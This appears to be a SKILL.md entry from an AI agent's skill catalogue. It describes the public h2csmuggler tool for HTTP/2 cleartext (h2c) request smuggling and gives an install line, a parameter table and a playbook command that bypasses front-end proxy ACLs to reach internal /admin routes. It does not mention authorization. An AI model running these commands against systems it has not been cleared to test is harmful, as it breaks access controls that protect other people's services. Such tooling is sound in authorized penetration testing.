---
name: h2csmuggler-http2
description: "h2csmuggler uses h2c request smuggling to bypass frontend ACLs. Signals: web vulnerabilities, injection, concurrent multi-URL scanning."
zh-signals: "h2csmuggler: h2c 走私绕过前端 ACL。信号:web漏洞,注入,并发扫描多 URL。"
when-to-use: >-
  Use against HTTP/2-capable front-end proxies when h2c upgrade smuggling may bypass ACLs and reach internal or admin routes behind the gateway.
---

# h2csmuggler

- Attack Category: C09 Web Exploitation (HTTP Request Smuggling)
- Upstream Repository: https://github.com/BishopFox/h2csmuggler
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install h2csmuggler
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 h2csmuggler.py -u 'https://t.com' -x` | Detect h2c smuggling |
| `-u url -t` | Direct /admin bypass test |
| `--threads 10` | Concurrent multi-URL scanning |

## Attack Scenario Playbook

### h2c smuggling bypasses frontend ACLs

```bash
python3 h2csmuggler.py -u 'https://edge.t.com' -x -t /admin/users
# Smuggled internal routes after the h2c upgrade bypass WAF/gateway ACLs
```

## Notes

Uses the `Upgrade: h2c` header to make the frontend proxy pass cleartext HTTP/1.1 straight to the backend, bypassing gateway authentication. By BishopFox.
